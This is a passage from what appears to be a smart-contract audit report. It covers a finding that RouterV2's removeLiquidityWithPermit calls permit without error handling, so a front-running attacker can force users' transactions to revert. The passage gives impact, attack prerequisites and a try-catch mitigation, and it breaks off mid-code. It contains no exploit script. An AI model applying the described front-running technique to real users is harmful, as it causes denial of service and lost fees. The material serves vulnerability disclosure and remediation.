href=\"#finding-description-7\" aria-label=\"finding description 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe RouterV2 contract implements ERC-2612 permit functionality without protection against front-running attacks. The vulnerability stems from the deterministic nature of permit signatures and the lack of error handling when permit calls fail.\u003c/p\u003e\n\u003cp\u003eThis vulnerability follows a well-documented attack pattern that has been extensively researched. According to Trust Security’s comprehensive disclosure in January 2024: \u003ca href=\"https://www.trust-security.xyz/post/permission-denied\"\u003ehttps://www.trust-security.xyz/post/permission-denied\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“Consider, though, a situation where permit() is part of a contract call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_signature\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will revert if permit() was front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User loses this functionality when permit fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakingContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function deposits in a staking contract on behalf of the user. But what if an attacker extracts the _signature parameters from the \u003ccode\u003edeposit()\u003c/code\u003e call and frontruns it with a direct \u003ccode\u003epermit()\u003c/code\u003e? In this case, the end result is harmful, since the user loses the functionality that follows the \u003ccode\u003epermit()\u003c/code\u003e.”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eIn RouterV2’s \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e follows this exact vulnerable pattern:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// User loses liquidity removal functionality when permit fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs Trust Security formally identified: \u003cstrong\u003e“In fact, any function call that unconditionally performs \u003ccode\u003epermit()\u003c/code\u003e can be forced to revert this way.”\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThe root cause of the issue within the blackhole protocol is that RouterV2 makes unprotected external calls to LP token permit functions without any fallback mechanism or error handling:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Line 475 - No error handling\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a systematic vulnerability where any permit-based transaction can be griefed by extracting and front-running the permit signature.\u003c/p\u003e\n\u003ch3 id=\"code-location\" style=\"position:relative;\"\u003e\u003ca href=\"#code-location\" aria-label=\"code location permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eCode Location\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eRouterV2.sol#L475\u003c/code\u003e - \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e function\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eRouterV2.sol#L493\u003c/code\u003e - \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e function\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis vulnerability enables attackers to systematically deny service to users attempting to remove liquidity through permit-based functions, resulting in direct financial losses and protocol dysfunction.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsers lose transaction fees (typically \u003ccode\u003e$5-50\u003c/code\u003e per transaction depending on network congestion) when their transactions revert.\u003c/li\u003e\n\u003cli\u003eUsers must pay additional gas for traditional approve+remove patterns.\u003c/li\u003e\n\u003cli\u003eLiquidity removal becomes unreliable, forcing users to abandon efficient permit-based operations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Prerequisites:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMinimal: Attacker needs only basic mempool monitoring capability and gas fees.\u003c/li\u003e\n\u003cli\u003eNo special permissions or large capital requirements.\u003c/li\u003e\n\u003cli\u003eAttack can be automated and executed repeatedly.\u003c/li\u003e\n\u003cli\u003eWorks against any user attempting permit-based operations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement a different method of permit handling by wrapping the permit call in a try-catch block and only reverting if both the permit fails and the current allowance is insufficient for the operation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidityWithPermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapproveMax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapproveMax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Try permit, but don\u0026#39;t revert if it fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 